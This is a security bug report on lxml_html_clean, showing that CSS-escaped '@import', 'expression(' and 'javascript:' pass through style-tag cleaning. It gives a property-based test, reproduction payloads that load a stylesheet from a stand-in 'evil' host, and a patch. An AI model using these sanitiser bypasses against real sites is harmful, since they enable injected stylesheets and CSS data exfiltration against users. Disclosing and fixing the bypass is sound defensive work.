# Bug Report: lxml_html_clean.clean CSS-escaped `@import` survives `<style>` sanitisation

**Target**: `lxml_html_clean.clean` (`Cleaner.__call__`, `_replace_css_import`, `Cleaner._has_sneaky_javascript`)
**Severity**: High
**Bug Type**: Logic (security)
**Date**: 2026-10-06

## Summary

The default cleaner is supposed to strip `@import` from `<style>` content ("The imported CSS can do anything; we just can't allow" it). But if the at-rule name is written with a CSS escape sequence such as `@impor\74` or `@\69mport`, it isn't detected. Browsers decode these escapes, so they still load the external stylesheet. The same blind spot lets `e\78pression(` and `j\61vascript:` through inside `<style>` elements.

## Property-Based Test

```python
import re
from hypothesis import given, settings, strategies as st, HealthCheck
from lxml.html import fromstring
from lxml_html_clean import clean

def css_unescape(s):
    s = re.sub(r'/\*.*?\*/', '', s, flags=re.S)
    def rep(m):
        h = m.group(1)
        if h:
            try: return chr(int(h, 16))
            except (ValueError, OverflowError): return ''
        return m.group(2)
    s = re.sub(r'\\(?:([0-9a-fA-F]{1,6})\s?|(.))', rep, s, flags=re.S)
    return re.sub(r'\s+', '', s).lower()

kw = st.sampled_from(['@import', 'expression(', 'javascript:'])
def obfuscate(word):
    return st.tuples(*[st.sampled_from([c, c.upper(), '\\' + format(ord(c), 'x') + ' ',
                                         '\\' + format(ord(c), '06x'), '\\' + c, c + '/**/'])
                       for c in word]).map(''.join)
filler = st.sampled_from(['', 'color:red;', 'a{', '}', ' ', 'url(', '"', "'", 'alert(1)', ')'])
css = st.tuples(filler, kw.flatmap(obfuscate), filler,
                st.sampled_from(['url(http://evil/x.css)', '"http://evil/x"', 'alert(1)'])).map(''.join)
BAD = ('@import', 'expression(', 'javascript:')

@settings(max_examples=2000, suppress_health_check=list(HealthCheck))
@given(css)
def test_style_tag_safe(c):
    doc = fromstring('<div><style>%s</style><p>x</p></div>' % c.replace('<', ''))
    clean(doc)
    for el in doc.iter('style'):
        t = css_unescape(el.text or '')
        assert not any(b in t for b in BAD), (c, el.text)
```

**Failing input**: `c='@impor\\74 url(http://evil/x.css)'`

## Reproducing the Bug

```python
from lxml_html_clean import clean_html

print(clean_html(r'<div><style>@impor\74 url(http://evil/x.css);</style></div>'))
print(clean_html(r'<div><style>@\69mport url(http://evil/x.css);</style></div>'))
print(clean_html(r'<div><style>p{width:e\78pression(alert(1))}</style></div>'))
```

Output (every payload comes through unchanged):
```
<div><style>@impor\74 url(http://evil/x.css);</style></div>
<div><style>@\69mport url(http://evil/x.css);</style></div>
<div><style>p{width:e\78pression(alert(1))}</style></div>
```

For comparison, `@im\port` *is* caught (it becomes `/* deleted */`), because `_has_sneaky_javascript` simply deletes backslashes.

## Why This Is A Bug

Per CSS Syntax Level 3 (§4.3.4 / §4.3.11), escape sequences are valid inside at-keyword and identifier tokens. `@impor\74` therefore tokenises as the at-keyword `@import`, and a browser fetches and applies the attacker-supplied stylesheet. The cleaner explicitly tries to block this case: the `_replace_css_import` regex, the `'@import' in style` check in `_has_sneaky_javascript`, and the comment "The imported CSS can do anything; we just can't allow". It only handles the literal spelling, plus backslash-escaping of non-hex characters (`style.replace('\\', '')`). Hex escapes defeat it because removing the backslash leaves `@impor74`, not `@import`. With the default `Cleaner`, the untrusted CSS then survives into the output, which enables CSS-based data exfiltration and UI redressing. The same issue affects the `expression(` (legacy IE) and `javascript:` checks inside `<style>` elements.

## Fix

Decode CSS escapes before the security checks in `_has_sneaky_javascript` (and apply the same decoding before `_has_javascript_scheme` / `_looks_like_tag_content` in `_remove_sneaky_css_comments`):

```diff
--- a/lxml_html_clean/clean.py
+++ b/lxml_html_clean/clean.py
@@
 _substitute_whitespace = re.compile(r'[\s\x00-\x08\x0B\x0C\x0E-\x19]+').sub
+
+_css_escape_re = re.compile(r'\\(?:([0-9a-fA-F]{1,6})[ \t\r\n\f]?|(.))', re.S)
+
+def _decode_css_escapes(s):
+    def repl(m):
+        if m.group(1):
+            cp = int(m.group(1), 16)
+            return chr(cp) if 0 < cp <= 0x10FFFF and not 0xD800 <= cp <= 0xDFFF else '\ufffd'
+        return m.group(2)
+    return _css_escape_re.sub(repl, s)
@@ def _has_sneaky_javascript(self, style):
         style = self._substitute_comments('', style)
-        style = style.replace('\\', '')
+        style = _decode_css_escapes(style)
+        style = self._substitute_comments('', style)
+        style = style.replace('\\', '')
         style = _substitute_whitespace('', style)
         style = style.lower()
```
